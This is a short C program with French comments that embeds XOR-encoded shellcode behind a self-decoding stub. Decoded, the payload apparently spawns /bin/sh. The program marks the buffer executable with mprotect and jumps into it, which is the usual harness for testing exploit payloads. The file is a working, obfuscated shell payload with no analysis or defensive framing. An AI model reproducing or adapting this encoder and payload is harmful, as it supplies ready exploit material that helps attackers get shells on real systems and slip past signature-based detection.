#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// \xeb\x11\x5e\x31\xc9\xb1\xTailleDuShellCode\x80\x74\x0e\xff\xValeurDeLaCleXOR\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff" //
// Shell chiffre : \x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a

int main(){
unsigned char *shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x17\x80\x74\x0e\xff\xaa\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a";
  printf("Shellcode length: %x\n", strlen(shellcode));
  int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())shellcode;
  return ret();
}